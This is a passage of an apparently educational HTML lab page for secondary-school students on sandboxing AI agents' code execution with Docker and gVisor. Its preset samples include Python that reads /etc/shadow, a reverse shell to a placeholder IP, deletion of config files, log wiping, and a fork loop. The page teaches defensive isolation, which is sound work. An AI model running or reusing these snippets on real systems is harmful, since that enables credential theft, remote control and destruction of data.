@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI Agent Sandboxing Lab — Безопасное Выполнение Кода и Защита от RCE</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 96 96'%3E%3Cstyle%3E:root%7B--n:%2300214A;--r:%23FF1100%7D@media(prefers-color-scheme:dark)%7B:root%7B--n:%23FFFFFF;--r:%23FF3B26%7D%7D.nf%7Bfill:var(--n)%7D.ns%7Bstroke:var(--n);fill:none%7D.rf%7Bfill:var(--r)%7D.rs%7Bstroke:var(--r);fill:none%7D%3C/style%3E%3Cpath class='ns' stroke-width='11.5' d='M54.5 7.9A40.5 40.5 0 0 1 88.1 41.5M88.1 54.5A40.5 40.5 0 0 1 54.5 88.1M41.5 88.1A40.5 40.5 0 0 1 7.9 54.5M7.9 41.5A40.5 40.5 0 0 1 41.5 7.9'/%3E%3Ccircle class='rs' cx='48' cy='48' r='17.2' stroke-width='7.2'/%3E%3Crect class='rf' x='45.6' y='3' width='4.8' height='28' rx='.5'/%3E%3Crect class='rf' x='45.6' y='65' width='4.8' height='28' rx='.5'/%3E%3Crect class='rf' x='3' y='45.6' width='28' height='4.8' rx='.5'/%3E%3Crect class='rf' x='65' y='45.6' width='28' height='4.8' rx='.5'/%3E%3Ccircle class='nf' cx='48' cy='48' r='7.2'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Manrope:wght@600;700;800&family=Source+Sans+3:wght@400;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#0A0E17;
+  --paper:#111726;
+  --panel:#172033;
+  --panel-2:#1E2B45;
+  --ink-1:#F1F5F9;
+  --ink-2:#94A3B8;
+  --ink-3:#64748B;
+  --brand:#38BDF8;
+  --brand-navy:#0369A1;
+  --accent:#EF4444;
+  --accent-ink:#F87171;
+  --success:#10B981;
+  --warning:#F59E0B;
+  --purple:#A855F7;
+  --border:#26354F;
+  --radius:12px;
+  --mono:'JetBrains Mono',monospace;
+}
+:root[data-theme="light"]{
+  --bg:#F1F5F9;
+  --paper:#FFFFFF;
+  --panel:#F8FAFC;
+  --panel-2:#E2E8F0;
+  --ink-1:#0F172A;
+  --ink-2:#475569;
+  --ink-3:#64748B;
+  --brand:#0284C7;
+  --brand-navy:#0369A1;
+  --accent:#DC2626;
+  --accent-ink:#B91C1C;
+  --success:#059669;
+  --warning:#D97706;
+  --purple:#7C3AED;
+  --border:#CBD5E1;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  font-family:'Source Sans 3',sans-serif;
+  background:var(--bg);
+  color:var(--ink-1);
+  min-height:100vh;
+  padding:20px;
+  line-height:1.5;
+}
+.brandrule{
+  height:4px;
+  background:linear-gradient(90deg, #38BDF8, #818CF8, #EF4444);
+  position:fixed;
+  top:0;
+  left:0;
+  right:0;
+  z-index:100;
+}
+.top{
+  max-width:1400px;
+  margin:10px auto 20px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  flex-wrap:wrap;
+  gap:16px;
+  padding-bottom:16px;
+  border-bottom:1px solid var(--border);
+}
+.top h1{
+  font-family:'Manrope',sans-serif;
+  font-size:1.6rem;
+  font-weight:800;
+  color:var(--ink-1);
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+.top .sub{
+  font-size:0.85rem;
+  color:var(--ink-2);
+  margin-top:2px;
+  font-family:var(--mono);
+}
+.top-actions{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  flex-wrap:wrap;
+}
+button{
+  font-family:'Manrope',sans-serif;
+  font-weight:700;
+  font-size:0.85rem;
+  padding:8px 16px;
+  border-radius:8px;
+  border:1px solid var(--border);
+  background:var(--panel);
+  color:var(--ink-1);
+  cursor:pointer;
+  transition:all 0.2s ease;
+  display:inline-flex;
+  align-items:center;
+  gap:6px;
+}
+button:hover{background:var(--panel-2);border-color:var(--brand)}
+button.primary{
+  background:linear-gradient(135deg, #0284C7, #2563EB);
+  color:#fff;
+  border:none;
+}
+button.primary:hover{opacity:0.95;transform:translateY(-1px)}
+button.danger{
+  background:rgba(239, 68, 68, 0.15);
+  color:var(--accent-ink);
+  border-color:rgba(239, 68, 68, 0.4);
+}
+button.danger:hover{background:var(--accent);color:#fff}
+.langs{display:inline-flex;background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:2px}
+.langs .lg{border:none;background:transparent;padding:6px 12px;font-size:0.8rem;border-radius:6px}
+.langs .lg.is-on{background:var(--brand-navy);color:#fff}
+
+.container{
+  max-width:1400px;
+  margin:0 auto;
+  display:grid;
+  grid-template-columns:360px 1fr;
+  gap:24px;
+}
+@media (max-width:1024px){
+  .container{grid-template-columns:1fr}
+}
+
+.card{
+  background:var(--paper);
+  border:1px solid var(--border);
+  border-radius:var(--radius);
+  padding:20px;
+  display:flex;
+  flex-direction:column;
+  gap:16px;
+}
+.card-title{
+  font-family:'Manrope',sans-serif;
+  font-size:1.1rem;
+  font-weight:800;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  border-bottom:1px solid var(--border);
+  padding-bottom:10px;
+}
+.badge{
+  font-size:0.75rem;
+  font-family:var(--mono);
+  padding:3px 8px;
+  border-radius:6px;
+  background:var(--panel-2);
+  color:var(--ink-2);
+}
+.badge.green{background:rgba(16, 185, 129, 0.15);color:var(--success)}
+.badge.red{background:rgba(239, 68, 68, 0.15);color:var(--accent-ink)}
+.badge.yellow{background:rgba(245, 158, 11, 0.15);color:var(--warning)}
+
+/* Preset selector */
+.presets{
+  display:flex;
+  flex-direction:column;
+  gap:8px;
+}
+.preset-btn{
+  text-align:left;
+  padding:10px 14px;
+  border-radius:8px;
+  background:var(--panel);
+  border:1px solid var(--border);
+  color:var(--ink-1);
+  display:flex;
+  flex-direction:column;
+  gap:4px;
+  cursor:pointer;
+  transition:all 0.15s;
+}
+.preset-btn:hover{background:var(--panel-2)}
+.preset-btn.active{border-color:var(--brand);background:rgba(56, 189, 248, 0.1)}
+.preset-btn .p-name{font-weight:700;font-size:0.9rem;display:flex;align-items:center;gap:6px}
+.preset-btn .p-desc{font-size:0.8rem;color:var(--ink-2)}
+
+/* Sandbox Switches */
+.switches{
+  display:flex;
+  flex-direction:column;
+  gap:12px;
+}
+.switch-item{
+  display:flex;
+  align-items:flex-start;
+  gap:12px;
+  background:var(--panel);
+  padding:12px;
+  border-radius:8px;
+  border:1px solid var(--border);
+  cursor:pointer;
+  transition:border-color 0.15s;
+}
+.switch-item:hover{border-color:var(--ink-3)}
+.switch-item.enabled{border-color:rgba(16, 185, 129, 0.4);background:rgba(16, 185, 129, 0.05)}
+.switch-box{
+  position:relative;
+  width:42px;
+  height:24px;
+  background:var(--ink-3);
+  border-radius:12px;
+  flex-shrink:0;
+  transition:background 0.2s;
+}
+.switch-item.enabled .switch-box{background:var(--success)}
+.switch-knob{
+  position:absolute;
+  width:18px;
+  height:18px;
+  background:#fff;
+  border-radius:50%;
+  top:3px;
+  left:3px;
+  transition:left 0.2s;
+}
+.switch-item.enabled .switch-knob{left:21px}
+.switch-info{display:flex;flex-direction:column;gap:2px}
+.switch-title{font-weight:700;font-size:0.88rem}
+.switch-flag{font-family:var(--mono);font-size:0.75rem;color:var(--brand)}
+.switch-desc{font-size:0.78rem;color:var(--ink-2);margin-top:2px}
+
+/* Main Area */
+.main-view{
+  display:flex;
+  flex-direction:column;
+  gap:20px;
+}
+.editor-card{
+  background:var(--paper);
+  border:1px solid var(--border);
+  border-radius:var(--radius);
+  overflow:hidden;
+}
+.editor-head{
+  background:var(--panel);
+  padding:12px 18px;
+  border-bottom:1px solid var(--border);
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+.editor-head .file-tab{
+  font-family:var(--mono);
+  font-size:0.85rem;
+  display:flex;
+  align-items:center;
+  gap:8px;
+  color:var(--ink-1);
+}
+.editor-area{
+  padding:16px;
+  background:#090D16;
+  font-family:var(--mono);
+  font-size:0.9rem;
+  line-height:1.6;
+  color:#E2E8F0;
+  min-height:160px;
+  border:none;
+  outline:none;
+  width:100%;
+  resize:vertical;
+}
+:root[data-theme="light"] .editor-area{
+  background:#1E293B;
+  color:#F8FAFC;
+}
+
+/* Terminal & Telemetry */
+.terminal-card{
+  background:#05080E;
+  border:1px solid var(--border);
+  border-radius:var(--radius);
+  overflow:hidden;
+  box-shadow:0 10px 30px rgba(0,0,0,0.4);
+}
+.terminal-head{
+  background:#0D1322;
+  padding:10px 16px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  border-bottom:1px solid var(--border);
+}
+.terminal-dots{display:flex;gap:6px}
+.t-dot{width:11px;height:11px;border-radius:50%}
+.t-dot.r{background:#EF4444}
+.t-dot.y{background:#F59E0B}
+.t-dot.g{background:#10B981}
+.terminal-body{
+  padding:18px;
+  font-family:var(--mono);
+  font-size:0.85rem;
+  color:#94A3B8;
+  max-height:340px;
+  overflow-y:auto;
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+}
+.term-line{display:flex;gap:10px;align-items:flex-start}
+.term-prompt{color:#38BDF8;font-weight:700;flex-shrink:0}
+.term-cmd{color:#F8FAFC;word-break:break-all}
+.term-out{white-space:pre-wrap;margin-left:22px;word-break:break-all}
+.term-out.err{color:#F87171}
+.term-out.ok{color:#34D399}
+.term-out.warn{color:#FBBF24}
+.term-out.meta{color:#64748B}
+
+/* Telemetry Bar */
+.telemetry-row{
+  display:grid;
+  grid-template-columns:repeat(4, 1fr);
+  gap:16px;
+}
+@media (max-width:768px){
+  .telemetry-row{grid-template-columns:1fr 1fr}
+}
+.tele-box{
+  background:var(--paper);
+  border:1px solid var(--border);
+  border-radius:10px;
+  padding:14px;
+  display:flex;
+  flex-direction:column;
+  gap:6px;
+}
+.tele-title{font-size:0.75rem;color:var(--ink-3);text-transform:uppercase;font-weight:700;letter-spacing:0.5px}
+.tele-val{font-family:var(--mono);font-size:1.15rem;font-weight:700}
+.tele-val.safe{color:var(--success)}
+.tele-val.danger{color:var(--accent-ink)}
+.tele-val.warn{color:var(--warning)}
+.tele-foot{font-size:0.75rem;color:var(--ink-2)}
+
+/* Quests */
+.quests-card{
+  background:var(--paper);
+  border:1px solid var(--border);
+  border-radius:var(--radius);
+  padding:20px;
+}
+.quests-list{
+  display:grid;
+  grid-template-columns:repeat(4, 1fr);
+  gap:14px;
+  margin-top:14px;
+}
+@media (max-width:900px){
+  .quests-list{grid-template-columns:1fr 1fr}
+}
+@media (max-width:550px){
+  .quests-list{grid-template-columns:1fr}
+}
+.quest-item{
+  background:var(--panel);
+  border:1px solid var(--border);
+  border-radius:8px;
+  padding:12px;
+  display:flex;
+  flex-direction:column;
+  gap:8px;
+  position:relative;
+}
+.quest-item.done{border-color:rgba(16, 185, 129, 0.4);background:rgba(16, 185, 129, 0.05)}
+.quest-num{font-family:var(--mono);font-size:0.75rem;color:var(--ink-3);font-weight:700}
+.quest-name{font-weight:700;font-size:0.85rem}
+.quest-desc{font-size:0.78rem;color:var(--ink-2);flex-grow:1}
+.quest-status{font-size:0.75rem;font-weight:700;color:var(--ink-3);display:flex;align-items:center;gap:4px}
+.quest-item.done .quest-status{color:var(--success)}
+
+/* Modal / Certificate */
+.modal-overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.7);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:999;
+  padding:20px;
+}
+.modal-overlay.open{display:flex}
+.cert-box{
+  background:var(--paper);
+  border:2px solid var(--brand);
+  border-radius:16px;
+  max-width:650px;
+  width:100%;
+  padding:32px;
+  text-align:center;
+  display:flex;
+  flex-direction:column;
+  gap:16px;
+  box-shadow:0 20px 50px rgba(0,0,0,0.5);
+}
+.cert-icon{font-size:3rem}
+.cert-title{font-family:'Manrope',sans-serif;font-size:1.8rem;font-weight:800;color:var(--brand)}
+.cert-meta{font-family:var(--mono);font-size:0.9rem;color:var(--ink-2);margin:10px 0}
+.cert-body{font-size:0.95rem;color:var(--ink-1);line-height:1.6}
+.cert-actions{display:flex;justify-content:center;gap:12px;margin-top:10px}
+</style>
+</head>
+<body>
+
+<div class="brandrule"></div>
+
+<div class="top">
+  <div>
+    <h1 data-ru="🛡️ Sandboxing Lab — Безопасное Выполнение Кода AI" data-en="🛡️ Sandboxing Lab — AI Safe Code Execution">🛡️ Sandboxing Lab — Xavfsiz Kod Bajarish</h1>
+    <div class="sub" data-ru="10–11 классы · Урок 19 · Изоляция Агентов · Защита от RCE · gVisor & Docker" data-en="Grades 10–11 · Lesson 19 · Agent Isolation · RCE Defense · gVisor & Docker">10–11-sinflar · 19-dars · Agent Izolyatsiyasi · RCE Himoyasi · gVisor & Docker</div>
+  </div>
+  <div class="top-actions">
+    <button id="certBtn" class="primary" data-ru="📜 Сертификат Аудита" data-en="📜 Audit Certificate">📜 Audit Sertifikati</button>
+    <span class="langs">
+      <button class="lg is-on" data-l="ru">RU</button>
+      <button class="lg" data-l="en">EN</button>
+      <button class="lg" data-l="uz">UZ</button>
+    </span>
+    <button id="themeBtn">◐ АВТО</button>
+  </div>
+</div>
+
+<div class="container">
+
+  <!-- Left Sidebar: Controls & Switches -->
+  <div class="card">
+    <div class="card-title">
+      <span data-ru="Сценарии Атак (Пресеты)" data-en="Attack Scenarios (Presets)">Hujum Ssenariylari (Presetlar)</span>
+      <span class="badge yellow" data-ru="OWASP LLM02" data-en="OWASP LLM02">OWASP LLM02</span>
+    </div>
+    
+    <div class="presets">
+      <div class="preset-btn active" data-p="safe">
+        <div class="p-name"><span data-ru="🟢 1. Безопасный скрипт" data-en="🟢 1. Safe Script">🟢 1. Xavfsiz skript</span></div>
+        <div class="p-desc" data-ru="Вычисление математических рядов и аналитика без системных вызовов." data-en="Math computation & analytics without dangerous syscalls.">Matematik hisob-kitoblar va xavfsiz analitika.</div>
+      </div>
+      <div class="preset-btn" data-p="shadow">
+        <div class="p-name"><span data-ru="🔴 2. Чтение /etc/shadow" data-en="🔴 2. Read /etc/shadow">🔴 2. /etc/shadow ni o'qish</span></div>
+        <div class="p-desc" data-ru="Кража хэшей паролей хоста через os.system('cat /etc/shadow')." data-en="Stealing host password hashes via os.system('cat /etc/shadow').">os.system('cat /etc/shadow') orqali parollarni o'g'irlash.</div>
+      </div>
+      <div class="preset-btn" data-p="revshell">
+        <div class="p-name"><span data-ru="🔴 3. Reverse Shell (C2)" data-en="🔴 3. Reverse Shell (C2)">🔴 3. Reverse Shell (C2 Tarmoq)</span></div>
+        <div class="p-desc" data-ru="Попытка подключения к внешнему серверу злоумышленника через curl/nc." data-en="Connecting back to external attacker server via curl/nc.">curl/nc orqali tashqi xaker serveriga ulanish.</div>
+      </div>
+      <div class="preset-btn" data-p="wipe">
+        <div class="p-name"><span data-ru="🔴 4. Удаление Файлов (rm -rf)" data-en="🔴 4. Disk Wipe (rm -rf)">🔴 4. Fayllarni o'chirish (rm -rf)</span></div>
+        <div class="p-desc" data-ru="Попытка уничтожения файловой системы и вредоносная запись." data-en="Attempting filesystem destruction and malicious disk write.">Fayllarni o'chirib tashlash va buzg'unchilik.</div>
+      </div>
+      <div class="preset-btn" data-p="forkbomb">
+        <div class="p-name"><span data-ru="🔴 5. Fork-Бомба (DoS)" data-en="🔴 5. Fork Bomb (DoS)">🔴 5. Fork-Bomba (Resurs DoS)</span></div>
+        <div class="p-desc" data-ru="Бесконечное порождение процессов для зависания ядра хоста." data-en="Infinite process spawning to crash host kernel.">Server protsessorini muzlatib qo'yuvchi cheksiz tsikl.</div>
+      </div>
+    </div>
+
+    <div class="card-title" style="margin-top:10px;">
+      <span data-ru="Барьеры Sandboxing" data-en="Sandboxing Barriers">Sandboxing Himoya To'siqlari</span>
+      <span id="defenseScore" class="badge red">0 / 6 ON</span>
+    </div>
+
+    <div class="switches">
+      <div class="switch-item" data-sw="user">
+        <div class="switch-box"><div class="switch-knob"></div></div>
+        <div class="switch-info">
+          <div class="switch-title" data-ru="1. Непривилегированный Пользователь" data-en="1. Non-Root User">1. Ruxsatsiz Foydalanuvchi</div>
+          <div class="switch-flag">USER sandbox (UID 10001)</div>
+          <div class="switch-desc" data-ru="Блокирует root-доступ к системным конфигам." data-en="Blocks root access to host sensitive configs.">Root huquqlarini cheklaydi, parollarni himoyalaydi.</div>
+        </div>
+      </div>
+
+      <div class="switch-item" data-sw="readonly">
+        <div class="switch-box"><div class="switch-knob"></div></div>
+        <div class="switch-info">
+          <div class="switch-title" data-ru="2. Read-Only Файловая Система" data-en="2. Read-Only Root Filesystem">2. Faqat O'qish Uchun Tizim</div>
+          <div class="switch-flag">--read-only --tmpfs /tmp</div>
+          <div class="switch-desc" data-ru="Запрещает модификацию и удаление файлов ядра." data-en="Prevents file deletion or tampering on disk.">Fayllarni o'chirish yoki o'zgartirishni taqiqlaydi.</div>
+        </div>
+      </div>
+
+      <div class="switch-item" data-sw="caps">
+        <div class="switch-box"><div class="switch-knob"></div></div>
+        <div class="switch-info">
+          <div class="switch-title" data-ru="3. Сброс Linux Capabilities" data-en="3. Drop Linux Capabilities">3. Linux Imtiyozlarini O'chirish</div>
+          <div class="switch-flag">--cap-drop=ALL --no-new-privileges</div>
+          <div class="switch-desc" data-ru="Лишает контейнер прав на смену владельцев, chroot и raw-сокеты." data-en="Drops all raw socket, mount, and chroot capabilities.">Raw-socket, mount va kiber-imtiyozlarni bloklaydi.</div>
+        </div>
+      </div>
+
+      <div class="switch-item" data-sw="net">
+        <div class="switch-box"><div class="switch-knob"></div></div>
+        <div class="switch-info">
+          <div class="switch-title" data-ru="4. Сетевая Изоляция (Egress Kill)" data-en="4. Network Isolation (Egress Kill)">4. Tarmoqni To'liq Uzish</div>
+          <div class="switch-flag">--network=none</div>
+          <div class="switch-desc" data-ru="Обрубает весь исходящий и входящий сетевой трафик." data-en="Kills all outgoing reverse shell traffic.">Tashqi xaker serveriga ulanishni 100% to'xtatadi.</div>
+        </div>
+      </div>
+
+      <div class="switch-item" data-sw="limits">
+        <div class="switch-box"><div class="switch-knob"></div></div>
+        <div class="switch-info">
+          <div class="switch-title" data-ru="5. Лимиты Ресурсов (cgroups v2)" data-en="5. Resource Limits (cgroups v2)">5. Resurs Cheklovlari (cgroups)</div>
+          <div class="switch-flag">--memory=128m --cpus=0.5 --pids-limit=20</div>
+          <div class="switch-desc" data-ru="Предотвращает исчерпание RAM/CPU и fork-бомбы." data-en="Prevents RAM exhaustion and fork-bomb crashes.">RAM va protsesslar sonini cheklab, DoS dan asraydi.</div>
+        </div>
+      </div>
+
+      <div class="switch-item" data-sw="gvisor">
+        <div class="switch-box"><div class="switch-knob"></div></div>
+        <div class="switch-info">
+          <div class="switch-title" data-ru="6. gVisor Microkernel Sandbox" data-en="6. gVisor Microkernel Sandbox">6. gVisor Mikroyadro Izolyatsiyasi</div>
+          <div class="switch-flag">--runtime=runsc</div>
+          <div class="switch-desc" data-ru="Перехватывает системные вызовы в пространстве пользователя." data-en="Intercepts syscalls in userspace, shielding host kernel.">Xost yadrosini himoyalovchi virtual proksi-yadro.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Right Area: Editor, Execution, Terminal & Telemetry -->
+  <div class="main-view">
+    
+    <!-- Code Editor Card -->
+    <div class="editor-card">
+      <div class="editor-head">
+        <div class="file-tab">
+          <span>🐍 agent_executor.py</span>
+          <span id="runtimeBadge" class="badge yellow" data-ru="Окружение: Bare-Metal (Root)" data-en="Runtime: Bare-Metal (Root)">Muhit: Bare-Metal (Root)</span>
+        </div>
+        <div style="display:flex;gap:8px;">
+          <button id="resetCodeBtn" data-ru="↺ Сбросить код" data-en="↺ Reset Code">↺ Qayta o'rnatish</button>
+          <button id="runBtn" class="primary" data-ru="▶ Выполнить в Стенде" data-en="▶ Execute in Sandbox">▶ Sandboxed Bajarish</button>
+        </div>
+      </div>
+      <textarea id="codeEditor" class="editor-area" spellcheck="false" data-placeholder-ru="# Вставьте код Python..." data-placeholder-en="# Insert Python script..." placeholder="# Python kodini kiriting...">import math
+
+# Safe Analytics Task
+data = [14, 28, 42, 56, 70, 84, 98]
+variance = sum((x - sum(data)/len(data))**2 for x in data) / len(data)
+print(f"[OK] Processed {len(data)} items successfully.")
+print(f"[OK] Mean: {sum(data)/len(data):.2f}, StdDev: {math.sqrt(variance):.2f}")
+</textarea>
+    </div>
+
+    <!-- Telemetry Row -->
+    <div class="telemetry-row">
+      <div class="tele-box">
+        <div class="tele-title" data-ru="Целостность Хоста" data-en="Host Integrity">Xost Yaxlitligi</div>
+        <div id="teleHost" class="tele-val safe">100% OK</div>
+        <div id="teleHostSub" class="tele-foot" data-ru="Ядро не скомпрометировано" data-en="Kernel uncompromised">Tizim yadrosi xavfsiz</div>
+      </div>
+      <div class="tele-box">
+        <div class="tele-title" data-ru="Утечка Данных" data-en="Data Exfiltration">Ma'lumot O'g'irlanishi</div>
+        <div id="teleLeak" class="tele-val safe">0 BYTES</div>
+        <div id="teleLeakSub" class="tele-foot" data-ru="Трафик чист" data-en="Clean egress">Tashqi tarmoqqa chiqish yo'q</div>
+      </div>
+      <div class="tele-box">
+        <div class="tele-title" data-ru="Статус Выполнения" data-en="Execution Status">Bajarilish Holati</div>
+        <div id="teleStatus" class="tele-val safe">IDLE</div>
+        <div id="teleStatusSub" class="tele-foot" data-ru="Ожидание запуска" data-en="Awaiting run">Kutilmoqda</div>
+      </div>
+      <div class="tele-box">
+        <div class="tele-title" data-ru="Радиус Поражения" data-en="Blast Radius">Zararlanish Radiusi</div>
+        <div id="teleBlast" class="tele-val danger">MAX (HOST)</div>
+        <div id="teleBlastSub" class="tele-foot" data-ru="Root доступ открыт" data-en="Full root access">Cheklovlar yo'q</div>
+      </div>
+    </div>
+
+    <!-- Terminal Output -->
+    <div class="terminal-card">
+      <div class="terminal-head">
+        <div class="terminal-dots">
+          <div class="t-dot r"></div>
+          <div class="t-dot y"></div>
+          <div class="t-dot g"></div>
+        </div>
+        <span style="font-family:var(--mono);font-size:0.8rem;color:var(--ink-2);" data-ru="Консоль Запуска Контейнера (stdout / stderr / audit)" data-en="Container Execution Console (stdout / stderr / audit)">Konteyner Konsoli (stdout / stderr / audit)</span>
+        <button id="clearTermBtn" style="padding:4px 8px;font-size:0.75rem;" data-ru="Очистить" data-en="Clear">Tozalash</button>
+      </div>
+      <div id="termBody" class="terminal-body">
+        <div class="term-line">
+          <span class="term-prompt">agent@sandbox:~$</span>
+          <span class="term-cmd">docker info --format '{{.SecurityOptions}}'</span>
+        </div>
+        <div class="term-out meta">[AUDIT] Sandbox telemetry daemon v2.4 initialized. Ready for execution inspection.</div>
+      </div>
+    </div>
+
+    <!-- Quests -->
+    <div class="quests-card">
+      <div class="card-title">
+        <span data-ru="Лабораторные Задания (10 Баллов)" data-en="Lab Quests (10 Points)">Amaliy Kvestlar (10 Ballik Mezon)</span>
+        <span id="questScoreBadge" class="badge green">0 / 4 Bajarildi</span>
+      </div>
+      <div class="quests-list">
+        <div class="quest-item" id="q1">
+          <div class="quest-num">QUEST 1 (2.5 BALL)</div>
+          <div class="quest-name" data-ru="Host Compromise" data-en="Host Compromise">Xostni Buzish</div>
+          <div class="quest-desc" data-ru="Запустите скрипт чтения /etc/shadow без защит и зафиксируйте утечку паролей." data-en="Run /etc/shadow preset without defenses to record password hash leakage.">Himoyasiz holatda /etc/shadow ni o'qib, xavfni qayd eting.</div>
+          <div class="quest-status"><span>⏳ Kutilmoqda</span></div>
+        </div>
+        <div class="quest-item" id="q2">
+          <div class="quest-num">QUEST 2 (2.5 BALL)</div>
+          <div class="quest-name" data-ru="User & Read-Only" data-en="User & Read-Only">User & Read-Only</div>
+          <div class="quest-desc" data-ru="Включите Non-Root и Read-Only. Заблокируйте кражу паролей и удаление файлов." data-en="Enable Non-Root and Read-Only to reject credential theft & disk wipe.">Non-Root va Read-Only yoqib, fayllar o'chirilishini to'xtating.</div>
+          <div class="quest-status"><span>⏳ Kutilmoqda</span></div>
+        </div>
+        <div class="quest-item" id="q3">
+          <div class="quest-num">QUEST 3 (2.5 BALL)</div>
+          <div class="quest-name" data-ru="Egress Kill" data-en="Egress Kill">Tarmoqni To'sish</div>
+          <div class="quest-desc" data-ru="Включите Сетевую Изоляцию (--network=none) и остановите Reverse Shell C2." data-en="Enable Network Isolation to eliminate the C2 reverse shell connection.">--network=none orqali Reverse Shell kiber-hujumini qaytaring.</div>
+          <div class="quest-status"><span>⏳ Kutilmoqda</span></div>
+        </div>
+        <div class="quest-item" id="q4">
+          <div class="quest-num">QUEST 4 (2.5 BALL)</div>
+          <div class="quest-name" data-ru="Hardened Defense" data-en="Hardened Defense">To'liq Qattiq Himoya</div>
+          <div class="quest-desc" data-ru="Активируйте все 6 защит. Остановите fork-бомбу и получите сертификат аудитора." data-en="Activate all 6 barriers, defeat the fork-bomb and earn your Auditor Certificate.">Barcha 6 ta to'siqni yoqib, fork-bombani to'xtating va sertifikat oling.</div>
+          <div class="quest-status"><span>⏳ Kutilmoqda</span></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+</div>
+
+<!-- Modal Certificate -->
+<div id="certModal" class="modal-overlay">
+  <div class="cert-box">
+    <div class="cert-icon">🛡️🏆</div>
+    <div class="cert-title" data-ru="СЕРТИФИКАТ ИНЖЕНЕРА БЕЗОПАСНОСТИ" data-en="SECURITY ENGINEER CERTIFICATE">XAVFSIZLIK MUHANDISI SERTIFIKATI</div>
+    <div class="cert-meta" data-ru="Target International School · 10–11 классы · Урок 19 · 12.10.2026" data-en="Target International School · Grades 10–11 · Lesson 19 · 12.10.2026">Target International School · 10–11-sinflar · 19-dars · 12.10.2026</div>
+    <div class="cert-body" data-ru="Настоящий сертификат подтверждает, что студент успешно исследовал вектор угрозы RCE при выполнении кода автономными AI-агентами, построил 6-уровневый эшелон изоляции (gVisor, cgroups, --cap-drop, --read-only, --network none) и защитил хост-систему от взлома на 10/10 баллов!" data-en="This certificate confirms that the student successfully analyzed the Agentic RCE threat vector, established a 6-layer defense-in-depth isolation perimeter (gVisor, cgroups, --cap-drop, --read-only, --network none), and hardened the production host scoring 10/10 points!">Ushbu sertifikat talaba AI agentlari tomonidan xavfli kod bajarilishidagi RCE tahdidini to'liq tadqiq qilgani, 6 qatlamli chuqur himoya perimetrini (gVisor, cgroups, --cap-drop, --read-only, --network none) amalda qurgani va xost tizimini 10/10 ballga himoyalaganini tasdiqlaydi!</div>
+    <div class="cert-actions">
+      <button onclick="window.print()" class="primary" data-ru="Печать Сертификата" data-en="Print Certificate">Chop etish</button>
+      <button id="closeCertBtn" data-ru="Закрыть" data-en="Close">Yopish</button>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var ORDER = ['ru','en','uz'];
+  var currentLang = 'ru';
+  var switches = {
+    user: false,
+    readonly: false,
+    caps: false,
+    net: false,
+    limits: false,
+    gvisor: false
+  };
+
+  var PRESETS = {
+    safe: {
+      code: "import math\n\n# Safe Analytics Task\ndata = [14, 28, 42, 56, 70, 84, 98]\nvariance = sum((x - sum(data)/len(data))**2 for x in data) / len(data)\nprint(f\"[OK] Processed {len(data)} items successfully.\")\nprint(f\"[OK] Mean: {sum(data)/len(data):.2f}, StdDev: {math.sqrt(variance):.2f}\")"
+    },
+    shadow: {
+      code: "import os\n\n# Malicious: Attempting to steal host password hashes\nprint(\"[!] Attempting to open /etc/shadow directly...\")\nwith open('/etc/shadow', 'r') as f:\n    hashes = f.readlines()[:3]\n    print(\"[PWNED] Leaked password hashes:\")\n    for h in hashes:\n        print(\"    \" + h.strip())"
+    },
+    revshell: {
+      code: "import socket, subprocess, os\n\n# Malicious: Opening reverse shell to external C2 server\ntarget_c2 = '198.51.100.23'\nport = 4444\nprint(f\"[!] Initiating TCP connection to {target_c2}:{port}...\")\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_c2, port))\nprint(\"[PWNED] Connection established! Spawning remote shell...\")\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call(['/bin/sh', '-i'])"
+    },
+    wipe: {
+      code: "import os, shutil\n\n# Malicious: Wiping critical files and creating backdoor\nprint(\"[!] Attempting to delete /etc/nginx/nginx.conf...\")\nos.remove('/etc/nginx/nginx.conf')\nprint(\"[!] Overwriting /var/log/audit.log with zeros...\")\nwith open('/var/log/audit.log', 'w') as f:\n    f.write('CLEANED')\nprint(\"[PWNED] Filesystem compromised, system logs erased!\")"
+    },
+    forkbomb: {
+      code: "import os, time\n\n# Malicious: Spawning runaway child processes to exhaust kernel PID table\nprint(\"[!] Initiating Fork Bomb... Spawning processes!\")\ncount = 0\nwhile count < 100:\n    os.fork()\n    count += 1\n    print(f\"Spawned generation {count}\")"
+    }
+  };
+
+  var completedQuests = { q1:false, q2:false, q3:false, q4:false };
+
+  // Language Switching
+  function applyLang(l){
+    currentLang = l;
+    document.documentElement.lang = l;
+    var els = document.querySelectorAll('[data-' + l + ']');
+    els.forEach(function(el){
+      el.innerHTML = el.getAttribute('data-' + l);
+    });
+    // Placeholders & Titles
+    var plEls = document.querySelectorAll('[data-placeholder-' + l + ']');
+    plEls.forEach(function(el){
+      el.placeholder = el.getAttribute('data-placeholder-' + l);
+    });
+    var titEls = document.querySelectorAll('[data-title-' + l + ']');
+    titEls.forEach(function(el){
+      el.title = el.getAttribute('data-title-' + l);
+    });
+    // Language buttons
+    document.querySelectorAll('.langs .lg').forEach(function(btn){
+      btn.classList.toggle('is-on', btn.getAttribute('data-l') === l);
+    });
